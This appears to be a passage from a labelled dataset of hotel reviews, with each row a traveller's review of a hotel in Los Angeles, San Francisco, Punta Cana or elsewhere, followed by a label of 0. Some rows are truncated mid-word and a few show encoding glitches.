joy. we will be back!!",0

average at best this is an old hotel with just enough renovations to get by in the beverly hills hotel market. i am a priorty club platinum member and stay at crownes all over the country/world and this is one of the worst i have stayed in. it is equivalent to a old holiday inn at best. i stayed in an executive suite it was not very nice. very loud wall air conditioners. parking is expensive as well.,0

"just amazing! i travel in from ny once a week for several years now. i like to stay at places that are fun, however, i wont sacrifice service just to enjoy my business trip. i work in the music business and this time when i called our travel office they told me they had a new hotel that i should try, it was the sofitel in la. i resisted as i had not heard of it before, but they assured me, it was the place.sure enough, it was! i met more artists in this hotel then any other. usually there is a hot place every so many years. the problem is it is usually something hot. a good bar, hot eatery however usually bad service. this is the l:a story...not the case here, from service in all areas to the rooms, to the nightlfe, even a surprisingly outstanding spa. it looks like i finally found a hotel that is hot and not one that will fade into the not scene because they overlooked something. they have thought of everything here, it looks like la has stepped up it's game and i have found a new home away from home...and i dont need to spend like a king at those other boring posh locations.if your considering another business trip, you might as well enjoy the trip and check this place out. it is true hollywood, the hollywood most people dont see. as a guest here you are part of the scene as though you are one of the famous celebs that live in beverly hills, and you are treated just as well.im looking forward to the summer and secretly enjoying my trips to la once again while everyone at work thinks im on just another arduous trip for work!",0

"Set the standards high for the rest of the hotels we stayed at We started a 14-day vacation with 5 days in San Francisco at this fantastic hotel. From the minute we entered the hotel lobby we recieved a friendly welcome from the Bell men to the Front Desk where we were upgraded (without even asking) to an unbeliveable room with a panaramic view of the ocean and the Bay Bridge. Our room had a soaking tub, a separate room with a spacious glass encased shower with a rain spout and double sinks and another spacious separate room with the toilet and another sink. Our king bed was extremely comfortable and the room came with a flat screen tv/bose sound system and soothing cd's were left by the bed.

"so close to getting a reasonable review!! i had read some fairly negative reviews about this hotel along with a few good ones and they came so close to getting a good one from me but faultered in the last hour of my 24 hour stay.i found the hotel to be pretty good up until this point with a nice business style standard about the premises. i doubt i would rate it 5 star when i compare it to the sheraton, westin, park hyatt etc but i felt it deserved a good 4.5 rating. the rooms were modern functional without being luxurious and the check in experience and concierge were above average. we had a deluxe king room that was comfortable. we had a drink in the bar which is quite nice with pleasant surrounds. so overall they were travelling pretty well.then came the stumble. we arrived at breakfast at 9.25 (with the buffett advertised to go to 10.30) and of the 8 or so warming bowls offering an assortment of hot food 5 where completly empty. no great problem so we enquired with the staff and where treated with absolute indifference. several other guests also pointed this out with the same response. we were in the dining area for 40 mins and in that whole time the only thing they topped up was some hash browns. i counted 9 staff running around but yet you had guests sitting there eating toast and nothing else and these staff treating paying guests with disdain. the gm of this hotel should kick their behinds and remind them that it is these very guests who pay their salaries! i wouldn't have cared if everything was empty if one of two things happened:a) they were polite and arranged things to be refreshed orb) they were polite and offered to have something cooked fresh from the kitchen.notice the key here is polite. unfortunately bad service and practices are a reflection of the management and the gm has to wear it has his/her responibility to either belt the apathy out of them or terminate them immediately. here is an idea terminate half of them put a rocket up the rest and i guarantee you tomorrow the apathy will be gone.then to the final stumble. i check out and pay with my amex, and to my disbelief they hit me with a surcharge. now i have stayed at hotels all round the world and have never been hit with this charge. i would have thought the sort of corporate/well heeled guest is what you are trying to attract and these are the sort of people who carry amex, so what do you do, accomo",0
"beautiful, imperfect first, the obvious: the public rooms are stunning. picture lofty ceilings, impressive frescos, sparkling chandeliers, rich carpets, gleaming floors. (on the down side, the chairs in the lovely lobby badly need recovering.) at our conference, food was served efficiently and was very good; bar prices were high but this is the big city! the meeting rooms were usually comfortable and well-set-up.as for the bedrooms, they are indeed old but pretty comfortable. my bed was excellent, but the sheets were coarse and scratchy. the bathroom was small, but i'm not used to palatial ones anyway and it was well-equipped. the shower was exellent. plastic flowers looked cheap. one wonderful surprise was the complimentary shuttle to the music center. we expected a minivan but were driven in style in a stretch limo. oh yeah! another surprise was all the filming in and around the hotel. it was fun to watch horses pull a chariot down the street past the cameras. apparently this kind of activity is very common. when you see the public rooms you'll understand why location directors love the place.i glanced into the fitness center. the pool is gorgeous but small. most of the facilities are coed--including the steam room. no thanks! the lobby bar is glamourous; the sports bar noisy (naturally), but it serves very good food at a reasonable price. there are many delis and cafes around to keep the food costs down.all in all, i would return. it's not perfect, but the management tries very hard to please and you can't beat the glitter.",0

"great choice my wife and i chose this best western after quite a bit of research. we were looking for something near or in downtown with free parking and air conditioning since she's pregnant and it was hot. the location was very good (close to the space needle and seattle offers free bus rides in downtown area), the free wireless was nice, and the continental breakfast is pretty impressive. the room is spacious enough, the bed was fairly comfortable with good pillows, and the shower had hot water and good pressure. the only complaints i might have had would be the front desk; aside from john c. they weren't much help. much of the front desk staff consisted of young people who mean well enough but don't have the social skills or confidence to answer good tourist questions. also, i had to negotiate for free parking since i was told that was offered over the phone. they were nice and cooperative about the parking issue. on the whole, this is a great value -- we get up and get going and this place offers what one needs to do that for a good, big city price. on a side note, we found the golden singha thai restaurant on cedar (short walk towards central downtown and the needle) to be excellent food for $8 (dinner).",0

"great for small group! took my teenage daughter, a friend her teenage son, and another adult friend (party of 5) for a quick getaway weekend the first weekend in may, 2005. we made our plans at the last minute and getting a 2 bedroom at the hospitality house seemed like a better deal than two room somewhere else. we arrived around noon on saturday and our apartment was already ready. desk attendant was very friendly. it was very clean, modestly furnished, but the perfect set up for a group of friends travelling together. one room had a queen bed, the other a twin with a trundle. the living room had a futon couch bed. the unit came stocked with a try of fresh fruit, and very small containers of milk and juice, a few single serve boxes of cereal, and some english muffins. we ate the fruit but didn't go for the rest of the stuff. kitchen was a full kitchen. we didn't really make use of the facility, but enjoyed hanging out in the living/dining room area till the small hours of the morning. upon checking out the desk attendant was again very helpful and stored our bags for the day. he even gave us a bag of ice for the road for my daughter who is still recovering from a broken leg. my only complaint was that it was a little further over to the east side than we prefer to stay -- but it was quite walkable and in a decent area.",0

"beautiful hotel my husband and i recently stayed at the millennium biltmore in los angles while i was on a business trip. overall, i'd say we were pretty satisfied with our stay. the hotel is beautiful and has such a fascinating history. i had to be careful to watch where i was walking because i was so busy looking up at the beautiful walls and ceilings. i was lucky enough to get to see several of the ballrooms because of the conference i was attending and i was just as amazed with those as with the rest of the hotel. the room we had was small but sufficient. i had to keep reminding myself that older hotels didn't necessarily have big rooms. we were right by the elevators though and heard the dings from the elevators at all hours of the night. the air conditioner worked very well, but it made a awful banging noise when it turned on and off. we could even hear the banging of the air conditioner in the neighboring room. we also had trouble with the water draining in the bathtub. after probably less than 2 minutes in the shower, the water was over my ankles. for late night snacks, don't count on the vending machines. the floors alternated between vending and ice machines and a search of a couple of floors with the vending machines only turned up coke machines. the hotel staff was friendly so that was nice. the food at the hotel restaurants was expensive which i somewhat expected. the problem was that on saturday and sunday most of the other stores and restaurants in the city are closed, so we didn't have much of a choice but to eat the food at the hotel. it would have been nice to have some other options. also as an fyi, there is no information in the room as to what ammenities are offered at the hotel (i.e. restaurants with menus or at least highlights and price ranges, pool hours, fitness facility hours, city transportation information, etc.). we found that a bit odd.",0

"had a great time despite the flaws! never having stayed in an all-inclusive resort, i didn't know what to expect. having read the very mixed reviews for this hotel, i was nervous about our trip to this hotel.the reviews that i read were very accurate and helpful, so if you need information, read them. my family of 5 was placed in two rooms in the villas section(1095, 1089) of the resort which i was not thrilled about after reading some of the reviews, but we were told that the other sections of the hotel were booked and we would have to come back in order to change rooms.(i did end up checking out a room in the middle of the resort on tuesday, it was nicer, but by then my family had settled into our rooms and was happy with them.) the room itself was adequate but needed work. a new tub/shower unit, mattresses/bed frame, and pillows(which we later referred to as the cotton ball pillows) would make quite a difference in the room. otherwise it was very clean. our a/c worked infrequently but was adequate, in my husband's room his a/c worked great. the villas are very cute. each 1story building had 10 rooms in it. the rooms have a front porch with chairs. the pathway to the villas, i felt, gave the place some charm. the grounds were well groomed and had beautiful trees and plants everywhere. the pool by the villas was the best of the three pools. it was the deepest and had a bar in it. the villas were also close to the 3 a-la-carte restaurants which you should try each at least once(*you must reserve in advance, so do it your first day there!). they are also close to the nightly shows that are put on by the very busy animation team. the food at the buffets was good. our favorite meal was breakfast because you could have an omelette made to order. at the buffets there was always plenty to choose from, however, the food was repeated, but plentiful, how could you complain?! you could be as busy as you liked or as relaxed as you wanted to be. there were many activities offered daliy. the beach is gorgeous!!! there is plenty to do. we snorkeled, borrowing the equipment for one hour and leaving a deposit of $30 per person. we saw some fish and plants near the back part of the roped in swimming area. we didn't use the other equipment available. we went on the 1/2 day excursion to the marinarium which involved snorkeling with nurse sharks and rays. it was very nice. *bring plenty of sunscreen; we went through a bottle by mid-week. *do not drink or brush your teeth with the tap water. there is filtered water available at the bars and restuarants to drink. the room refridgerator had 2 bottles of water in it, also which you can ask to have replaced. *bring imodium and tums for stomach/digestion issues. *if you like to snack between meals, bring your own, a can of pringle chips cost $4 at the hotel store. *learn some spanish, bring a dictionary, and at least try to speak their language. it makes things a lot easier. *some women are topless at the pools and on the beach(more so here), so if this kind of thing makes you uncomfortable, be aware.****have fun, relax, and forget about the little things; enjoy your vacation!!!!! if you book with apple vacations read on.... after booking our trip a few months in advance the price of the trip came down as the trip",0

"nice experience with only a couple flaws we stayed in a studio room nestled among larger casitas for our anniversary. note that almost all of the rooms at the pointe are suites, but a few like ours are not. though small, we really enjoyed our room. the room was clean, the bed was fluffy and soft, and the location of our room was in a quiet area away from most of the traffic. one thing you may want to consider is that quarters are tight in the shower, and tall people may have a problem with this. unlike the casitas, the studios do not have an assigned parking spot. we didn't have a problem though since there are some open spots you can use. overall we really enjoy staying here because of the comfortable rooms and the beautiful grounds.",0

"a fantastic holiday i did some research before visiting this resort, but i figured i would try it out myself before taking the opinions of others. i wasnt able to understand the negative feedback given to this high star rated resort offering countless ammenities and great entertainment to all its tourists, to say the least i had a fabulous vacation!we flew out of toronto on june 20 so you can only imagine the weather we were about to be in down south, very hottt! our arrival to punta cana was good the line up to go through customes was a little bit long at the punta cana airport but it went by quickly enough as they had girls dressed up in dresses taking there picture with you and greeting you amongst your arrival. we got out bags and headed out of the airport found our bus and were on our way to the resort, lets just say the drivers down there well i dont know if they actually obey the speed limit because according to our tour rep our resort was an hour from the airport and we made it to our hotel in about 30 minutes! not bad . we were immedietly greeted amongst our arrival at grand paradise and were offered some alcoholic beverages, yumm! check in was easy we had to wait about half an hour for our rooms but gave us a chance to check out the resort before we went and got our swim suits on! i was absolutly speechless, i had visited punta cana already but the beach and sand just takes your breath away. they had numerous pools too accomo",0

"stayed in the mandarin suite we just returned from one night at the edward ii inn. our choices on where to stay in san francisco on a holiday weekend for just one night were limited. most places required a three night stay. i was highly concerned after reading the reviews of late, but took a chance, since we were staying in the bed and breakfast rooms with private baths.we really had no problems at all. the staff was pleasant and helpful. the room was clean. and the location was good. the room: the mandarin suitethe room was up an odd short staircase directly off the breakfast room. but the door was heavy and the sounds from the adjoining room were not an issue. door was a bit hard to open, but locked securely. the decor was asian theme oriented with a nice black lacquer chinese style headboard on the bed and a pretty painted screen. the rest of the furniture was quite dated, and frankly needed updating. the electric fireplace was completely worthless as it produced no heat and was faced in such a way that you couldn't see the fake flames from the bed or the couch! the tv was a whopping12 screen, but it had clear reception and a dvd player. the bathroom was clean and spacious. there were plenty of towels, none of which were super plush, but all smelled, looked and felt clean. there was a blow dryer. there was no shower enclosure, which was a bit odd, but as i said there were lots of towels, so we could clean up the over spray. the other odd thing about the bathroom was the door to the toilet/shower/sink---if you are looking for privacy, forget it! the bathroom door has a large glass window in it. there was a cold mini fridge (i have paid twice as much for rooms in hotels that had warm fridges!). a small wet bar type sink and closet complete the room. the ceilings are high and the lighting was period in appearance. this is in an old building--so it is not ada compliant. overall the room was fine--it was clean and the theme provided charm to an otherwise outdated interior.the room did have windows that were frosted, so you couldn't see out. there was minimal alley type noise and you could hear dishes clanking from the restaurant next door. all was quiet at about 10 pm. the next noise we heard was around 7:30am when the garbage truck came. hey, it's a crowded city and you are staying in an old building--i am not expecting it to be absolutely quiet. there are many wonderful places to eat, wine bars, coffee spots, and shops on chestnut--one street over from lombard.the breakfast:this was also quite nice for the price we were paying. there was hot, fresh homemade quiche, yogurt, two types of cereal, store bought danish pastry, several types of breads, and a fruit plate. there was milk, water, tea, coffee, hot cocoa and orange juice. the dishes were clean and jai kept bringing out more piping hot quiche. newspapers and access to the internet were waiting for us in the morning. they told us when we were leaving that they don't open their pub much to the public, but if you want a drink in the evening, the staff will be happy to serve you. i wish they would have told us that the night we checked in!i have no idea what the european shared bathroom rooms were like--but i think everyone was satisfied with the bed and breakfast rooms. staff guided us to good food and public transportation options. i think that the accommodations are fine, but certainly not luxurious. i would stay here again.note: take bus 30 from powell bart station--do not attempt to walk from the end of the trolley car line, down lombard to the inn. that is the mistake we made coming in and boy, that climb up the big hill with our suitcases was grueling. bus 30 was a lifesaver! getting from the oakland airport to the marina area was not a problem--take air bart bus to the bart station in oakland and then head into san francisco. save your money and put it towards a good meal.",0

Simply the nicest hotel we have EVER stayed at. We chose this hotel for it's excellent location near the Metro Toronto Convention Centre. It is an all suites hotel and the room we had was fabulous. It was very clean and well supplied. There was a King sized bed in the seperate bedroom that was like sleeping on a cloud! The kids loved the fact that there were two tv's! Beyond the fabulous room was the extras that came along with our $209.00 a night. A FULL hot breakfast buffet every morning and a cocktail reception each night. The indoor pool is great and the hot tub was very relaxing after a long day at our convention. The most memorable part of our stay was the impecable service.The Marriott team is to be praised for their attentivness and politeness. Everyone from the Valet that meets you at the door to the team at the Front Desk are the most professional group that we have encountered to ,0

"wonderful stay! i stayed at the biltmore during a recent professional nursing convention with some trepidation. i read reviews that described the rooms as shabby outdated, the staff as unfriendly, and the neighborhood as unsafe. travelling across the country alone, i was very nervous about what i had gotten myself into. i could not have been happier with my stay wonder what was going on with those who had a negative experience. to say that the lobby and the common areas of the hotel are stunning is an understatement. everything speaks to the rich history of this landmark. i especially enjoyed learning about the hotel's role in the glory days of old hollywood. the staff was friendly and helpful, directing me to the best ways to get around the city and the things to do. cabs were very easy to come by, thanks to the staff of the hotel, but i chose to walk to and from the convention center each day. i did not ever feel unsafe walking alone downtown. i found the facilities to be more than adequate- the fitness center has a lot of equipment (more than i was expecting, based on one review) and was open around the clock. this was great for someone who was out of sorts with the time change and wide awake at 3 a.m. most days, ready to get going. although i did not eat in the hotel much, i had a wonderful, if pricey, breakfast at smeraldi's. for more value, there's a great little coffee shop around the corner on 6th, called the yorkshire grill, where i got a delicious breakfast for less than $10, including tip. my room was charming comfortable. the mattresses have, indeed, been upgraded and the linens were crisp, clean, and of high quality. yes, the tv was a little small, but who needs to spend much time watching tv when you're in la? if i wanted to nitpick, i'd say that the bathtub could have been re-glazed. other than that, my room was perfect. i met several other people staying at other local hotels for the convention who stated they would have rather been at the biltmore.",0

"Wonderful Experience (compared to a blizzard and -39 C at home) We returned from Punta Cana on January 17, 2007. We had an excellent time at the Barcelo Premium. Our stay overlapped time with previous reviewers on this page and I must say our experience was quite different from one for sure. My husband or myself were not sick at all. I would concur that sickness occurs when handwashing does not happen. My husband and I diligently washed our hands to prevent spreading germs and susceptibility to germs. My husband confirmed that about 50% of men did not wash their hands after using the washroom and I was shocked at the number of women who did not wash their hands but diligently checked their hair and lipstick (probably about 25%). As for flies, I never saw a fly until my fourth day at the resort. The staff were awesome, there was a huge variety of food to choose from on the buffet, we dined at 5 of the a la carte restaurants and all were very good, the beach and the pool at this resort are second to none, always a chair to be found at the beach, sometimes the pool was crowded. The beach towels are heavy and soft so nothing to complain about there. Although we were not required to tip the staff, we took great pleasure in doing so. If we liked the smile and the service we received we would give them an American dollar. Compared to Dominican wages, this would be like a windfall. We only tipped once per staff as we wanted to spread the cheer to as many Dominican people as we could. Our maid was excellent and we were brought fresh towels and as much bottled water as we asked for by 4:PM each day (For a tip, we would leave her a dollar and bath or lotion products with a note to ensure the products were not confiscated from her as she left the resort for home that night). She left us a different species of fresh flowers every day (I love flowers and do not get excited about towel animals so she won my heart). Our rooms were suitable but if there was one negative comment it would be that the rooms are in need of an up",0

(in all our years of hotel stays, that has never happened) then they screwed up our reservation from 3 people/2beds, and said it was 1 person/1 bed. oops! when we finally got what we had reserved, we found the wall paper peeling off the walls, and the pillows wrinkled as though they had been laid on. the hallways were stinky, the beds very uncomfortable, and the decor long out",0

great family vacation stayed at the hilton squaw peak for a week with my family and my neighbour and his family. i am hh diamond and booked both rooms and we were both upgraded to a casita and given two breakfast vouchers per day. the kids (ages 5-9) loved the river ranch and the staff was very friendly and helpful. we went during early october and aside from the weekend there were very few people at the pools so it was fairly quiet. i even saw a few people floating down the lazy river reading a book é¥?you probably couldné¥?? do that during the high season. we also spent an afternoon at the tapito cliffs hilton which was very nice but more suited to adults than families - although they did have a very good waterslide.all in all it was an excellent vacation and i will return next year.,0

"fantastic! what more can i say than fantastic! the rooms were fresh, bright and imaculately clean, and the staff, the staff was among the most hospitable i have ever come in contact with and i usually stay at the upper end hotels kudos to the management, they are doing a marvelous job.i have found a new home hotel and for only a margin of the cost that i am used to paying $$",0
"what a waste of what could be a great hotel stayed there feb 14, 2004 (born and raised in la and have tradition of staying in a different local hotel every valentine's day). stayed on 6th floor in a junior suite--had to turn off the air conditioning becuase fan was so loud (not broken, just old and loud) you could not talk over it. the only good thing about the roosevelt is the physical building itself--real 1920's era art deco blended in clsaaic spanish california touches. the bar is awesome--but we and all other guests could not enjoy it since the hotel rents it out to private parties;we wandered too close by mistake as we were trying to find a door to the street and 5 security guards were upon us. to use mini-bar, you have to walk down to front desk to get a key (and give your credit card). front desk gave us a key, but it did not work. did not bother going down again for fear of having security think i was again trying to crash the private rap music party. tried calling room service from our room for dinner--but after 50 or 60 rings and multiple calls they did not answer. called front desk which acted like it happens all the time and they transfereed me to room service (without any apology or even mention of fact room service does not answer phone). when room service came, all the girl wanted to talk about was the private party--the one no one else could get into. called room service again next moring for breakfast (actually had front desk connect me because they would again not answer call from our room) tried ordering coffee, but i was told to just make it myself on the mini-maker in our room. tried, but it was broken. i would not say staff (mostly all in their early 20's) is terrible, but the service is. my feeling is that it's management's fault--they simply give staff no guidance on how guests should be treated at fine hotels, with the result that the roosevelt is a fine physical building but sucks as a hotel.",0

"exceeded expectations! we expected somewhere cheapish and cheerful...which we got, but also a lot more! we didn't expect the location to be so fantastic (steps from a huge mall, steps from hollywood boulevard, and a couple of minutes walk from the metro. also right next door is a cinema complex, a theatre, and (just out of interest)the place where they give out the academy awards! we didn't expect free parking, which was a real bonus, nor did we expect the rooms to be quite so clean and spacious. the front desk was very friendly and helpful too. all in all we would highly recommend this location for a comfortable and surprisingly quiet stay in the heart of hollywood!",0

"Very good all-around hotel in a weird location Stayed at the Courtyard Marriott Boston South for my first ever trip to Boston. Was looking forward to the hotel after reading the rave reviews and was prepared for the location away from downtown. The shuttle service was pretty fast at picking us up from Logan and took us straight to the hotel. We were informed that the shuttle only runs to the airport, and would not run us to downtown. However, the front desk staff had in-depth, printed directions on how to walk to the nearest train station (Andrew) which was only five minutes away. The area around the hotel was somewhat quirky. It was semi-industrial and residential, and located close to a huge shopping centre with a Target and Old Navy. We walked to downtown on Massachusetts Ave several times, and even though it was a somewhat run-down area, we didn't feel unsafe or in harms way. However, there were homeless people and a meth clinic along the way, so it is somewhat dodgy. The walk to the train station was easy and very safe.The rooms were very clean and in good shape. Beds were comfortable, the pillows were perfect, and the decor was nice. The views weren't great, and were mostly of the 93, but we weren't in the room enough to care. The only other quirk was a lack of blankets on the beds. Nights can be a little chillThe staff was very helpful and was always polite and courteous. The accomo",0

"Check out other resorts before booking at the Ocean Blue and Sand I went to the Ocean Blue with my wife and family during the Christmas week. My parents had booked their rooms through RCI and I made a reservation with for my wife and me at the H10 website.The resort looks beautiful, with colorful villas and well maintained grounds. The two pools are clean and easy to get lounge chairs at all hours. Unfortunately, our experience was far from satisfactory. First of all, after check-in, we were told to go over to the desk to find out more about the resort. DO NOT DO THIS! It is a time share scam, trying to convince you to go to the presentation by dangling a lobster dinner as incentive. My parents did it, but I knew better just to grab my bag and head to the room.The room: We were checked into room 2210. At first glance, we knew the room wasn't the best. The furniture looked old and scratched, the walls were stained. Still, we didn't think it was a big deal. The bed was comfy and the room was generally clean. We had an end room with a balcony that was made more private by the trees.However, after spending a day there, we noticed that there were no mirrors or paintings on the walls, the towel rack in the bathroom was broken, the armoire was broken, the tablelamp on the bedstand was broken, the shower leaked water all over the bathroom floor, and there was no soap dish in the shower. In addition, my wife's purse was ransacked on our second day. Fortunately, we were wise to lock all our valuables and passports into our suitcases (having heard that even the room safes were not secure.) We complained to the front desk and were told that they would move us to another room if one was available. We spent two more nights in the room, and on the fourth day we returned to our room to get ready for dinner to find that the room wasn't clean yet. It was almost 6PM. My wife went to the front desk to complain again, and we were finally moved, after getting approval from the hotel manager, to a much better room, 9324. This room was much better with only a few minor issues. We found a wasps nest on our balcony and the glass in the sliding door was loose and not sealed. Regardless, this was 10 times better than 2210. Even the maid service was better.Later on I found out that certain rooms are reserved for specific travel agents and are not given to guests that pay full rack rate directly to the hotel. I have a feeling that the first room we were in was pieced together from the throw aways that the better rooms discarded.The food: Disappointing!! The a la carte restaurants only serve dinner. You have to eat breakfast and lunch at the buffet. Imagine 1000s of people touching the same serving spoons and you have ideal conditions for an epidemic. 6 of 8 people in our party ended up getting sick.Before and after having a subpar buffet meal, you are harrassed by timeshare salesmen. After 7 days of this, I was ready to explode.In addition, the a la carte dinners were average at best. I think only half of the food I ordered was good. They put the same instant mashed potatoes and steamed broccoli and carrots on every plate. Everything has some kind of chemical flavored sauce put on it. Don't even dream about fresh seafood. Everything is frozen, and most likely not even local.The restaurants all have a Disney-like fakeness, instead of being authentic. There is no genuine food here. After looking at the layout of the resort, it becomes increasingly clear that all the food comes from the same kitchen and the only way they make Mexican different from Italian or Dominican is by putting a different sauce on it.Special romantic dinner was a huge disappointment. Even though we had made special arrangements in advance, the restaurant had no idea that we were coming, our food was not available, and it took almost three hours to get our main courses. The lobster is not fresh and had a mushy texture.Bars: Generally good service, but it is pretty obvious that all the liquor is watered down. Even the wine is terrible. Certain restaurants have a decent wine list for extra $$$, but not most. Heres a tip: if you ask for the premium liquor every time you order, you will get a much better drink (coco loco con Bacardi por favor.)Pool and Beach: No big complaints, except if you want a beach cabana, get out early, they go quickly. I'm not a big fan of people laying claim to a spot and then disappearing for hours, but that's what it will take. Another issue: there are apparently beautiful coral reefs just off the beach that would make great snorkeling. Unfortunately, guests are prohibited from swimming out there because the motorboat traffic has killed people in the past. If you want to do any decent snorkeling you have to book an excursion, which will cost you $85-100 per person.Service was very good. Despite our complaints, we were accommo",0

"what a dump overpriced. obviously they charge an arm and a leg because it's the only hotel near the airport. and with good reason. it's covered by a highway running right over it, and airplanes taking off and landing right over that. i only used the room to sleep overnight due to a missed conenction, but don't waste your time. if i could have slept in the car, i would have. the rooms are run-down and dirty. my room had the previous guest's hair all over the sink and tub. i had to lug my wheeled suitcases up and down flights of stairs. everything was old and coated in a layer of grime. when i went to check out, there was a line all the way out the door leading to the hotel rooms. i didn't even check out, just cut to the side and left my keys on the front desk. the free shuttle to the airport is very helpful though; i guess that's the only thing that's worth charging for.",0

"phoenix family vacation okay, so we didn't want to go to the jersey shore this summer. we decided to go somewhere different, exciting. we booked the pointe hilton sqauw peak for a week (8/22-8/29). we have 3 children (2, 8, 10). they have a great water park and two wonderful pools. the hotel was clean and everything was well maintained. we decided to go to sedona for a day. it was beautiful but a bit boring for the kids so we drove to slide (slip?)rock state park. everyone enjoyed this river slide and the scenery is also wonderful. the kids didn't want to leave. since we were halfway to the south rim of the grand canyon, we decided to go and catch the sunset. on the way, we called inside the park for a hotel room and got lucky. incredible!!! pictures can't do it justice. the next day, we took the in-park tour buses at no extra charge - although, the national parks should be free for us citizens, since we pay taxes. we left midday and drove back to phoenix. a few days later, we made another day trip to slide rock again. on the way we went to montezuima's castle and meteor crater (pretty cool but not worth the $38 for 2 adults and 2 chilldren over 2). i would recommend this adventure for families who enjoy something different. we used frequent flier miles for three airline tickets and hilton honours points for the hotel stay.",0

(by the way, this hotel is technically in century city, just over the line from beverly hills.) l.a. has a lot to recommend it in culture and scenery, and i found little of that in this part of town, although my upper-floor room did offer a city view that was nice.the exercise room was cramped and creekity -- substandard, especially for a hotel in this price class.",0

"appalling check in and lots of lies we booked two suites both with a king bed, pre-paid for both suites and received a reservation confirmation from best western. on arriving at the hotel we were told that one suite was ready and the other would be an hour or so. when we got to the suite that was ready we found that it was not a one king bed suite but a two bed suite.i rang reception and spoke to a person called jamelia to ask to be allocated the right type of suite as per our reservation confirmation. her attitude was appalling and this is where the lies started. she initially said that the reservation had come through incorrect from best western or that i had not booked correctly on the website. i offered to take the best western reservation confirmation to reception as evidence and she said that this was of absolutely no interest to her and that it made no difference. she then said that there were no king bed suites at the hotel at all and that all suites had two beds. i asked her why their website stated that this type of room was available if they did not exist as she had just stated. she said the website must be incorrect. next we were offered a standard king bedroom, and i pointed out that this was a cheaper room than the suite we had booked. she said 'well you got a good rate by booking on line'. like that matters. i had paid $1900 up front for the suites 2 monthsé¥?prior when making the booking. i then asked if the next suite would also be two beds instead of the king bed as she had just stated that this type of suite did not exist. unbelievably she said that this next suite would have a king bed contradicting the lie she had just told us. at this point i asked to be put through to best western customer services and amazingly our room was changed to a king bed suite as per our reservation within the hour. the funny thing was that when we got to the room, there were welcome cookies and a welcome note for a mr and mrs bonfiglio. so, sorry to this couple as they probably got a load of lies and bull when they arrived to find that they did not get the room they had booked. the hotel is also very noisy but i guess this is inevitable considering the location. the free drinks are great if you and like the feeling of getting something for nothing. please also beware of the restaurant at the hotel. they state that there is an obligatory service charge for tables of more than 6. we dined as a party of 4 and were still hit with this and then the waitress failed to hand over $10 of change taking this as an additional service charge.on the plus side some of the staff were nice and helpful especially the concierge who was most gracious. the suites are a decent size, clean and the dècor is not of a bad standard. if you want to be near fishermans wharf the location is great. i did contact best western on returning home to see what response i would get after the investigation. apparently the hotel had told best western that we were contacted directly by the management during our stay and that the matter was resolved (we were not contacted). while they apologised for the inconvenience they said that there was nothing more to do as we were eventually given the room we had booked. no mention of the lies, arrogance and é¥?¦°p you attitudeé¥?of some of the staff then??",0

"great location i booked this hotel through priceline and was able to get a room at $80/night, which was a real steal. the hotel is at the top of a very steep hill, but it is in an excellent neighbourhood and is very accessible to union square and other major destinations.the rooms themselves are slightly outdated in decor, but certainly very clean and spacious. the beds are extremely comfortable, the windows open for fresh air, and the air conditioning also worked very well and quietly. in terms of the room quality, i would give this about a 4/5. however, the service is what prompted me to give this hotel a 5/5.the service at the front desk was effecient, polite, and very accommodating (despite my complicated requests). the maid service was invisible, and the room service never took more than 30 minutes to arrive, even on a busy friday/saturday night. the doormen were always on hand to open taxi doors and the front door and they did so with a smile. the only hidden charge for me was a 0.10/day tourist tax that i paid at the end of the stay. despite having booked on priceline at a much lower than regular rate, i felt that i was treated just as well as the full paying customers.i would definitely stay at this hotel again, especially if i could get the same deal from priceline.",0

"Not Recommended Having been to Hawaii several times before and stayed in Waikiki each time on Oahu, I was very disappointed with this hotel. Because we booked in a hurry for a last-minute trip, we regretfully didn't check out the reviews ahead of time. However, I am extremely surprised by the reviews I'm reading today -- most were positive, yet I just came back yesterday and I find it hard to believe we were all staying in the same hotel. I thought that the room was too small for two, only partially renovated, awkward decor -- furnishings were old and worn -- the bureau was placed in an awkward spot and not easy to access. The pictures on the wall were crooked and I tried to straighten them out, but they were adhered to the wall -- very strange. The television is old -- no flat LCDs here. It was attached to the wall with a mounting bracket, much like you'd find in a hospital room. The carpeting throughout the hallways must be from the previous property owners -- it's old, worn and ",0

"great price- conceirge was a rude i'd stay here again. but the concierge lady and some of the staff were pretty rude (funny- i thought they were there to serve you?)downtown la is a ghost town on the weekend (there is more to do in downtown fresno or lodi), especially at night. there is only a burger king, a california pizza place (i don't think they deliver) and a koo koo chicken (?) that was opened after 8:00 pm!!!you can drive or take a cab to little tokyo or olviera street, which are both really nice and really close. or i would suggest just bringing in food before you arrive.the rooms were nice and the beds were comfortable. it is close to a museum and the new disney music hall. and it has a nice courtyard to walk around.there is a shopping center on the property, but it is closed on the weekend.i would definitely go there or any of the 4 star hotels in downtown la again for the price we paid (60 bucks). in fact, if i stay the weekend again anywhere in la (including disneyland) -- i will book a hotel in downtown la. you think about it: you have to drive in la anyway. might as well live the high-life at one of these ritzy (if not empty) hotels.",0

"great staff, great room, great trip. my girlfriend and i stayed at omni for 2 nights and had a great time. after spending 4 nights in hollywood, we wanted to experience the downtown area of l.a. and we were glad we booked our stay at the omni. this place was a steal for the price we paid! our room was ready upon our arrival and the room was spacious and clean. my girlfriend raved about the spa (she had a massage and facial) and while she was being pampered, i enjoyed a few cocktails at the noe restaurant. the location was great as it was close to all the major throughfares. we parked our rental with the valet and it was quite expensive, but we never needed to jump back in the rental because the hotel provided a courtesy car which was free for any destination within a 3 mile radius of the hotel. we utilized the courtesy car (sleek lincoln navigator) to visit chinatown, to take us to dinner at arnie morton's steakhouse (excellent), in addition to a couple of other downtown destinations. i will definitely stay at the omni during my next trip to l.a.",0
"the kyoto grand was a disaster it seemed as if they bent over backwards to do everything the could to ruin our stay. we had a large wedding party and the staff was rude, neglectful, and oblivious to our concerns and needs. i will never stay at this hotel again and would discourage anyone else from staying there.",0
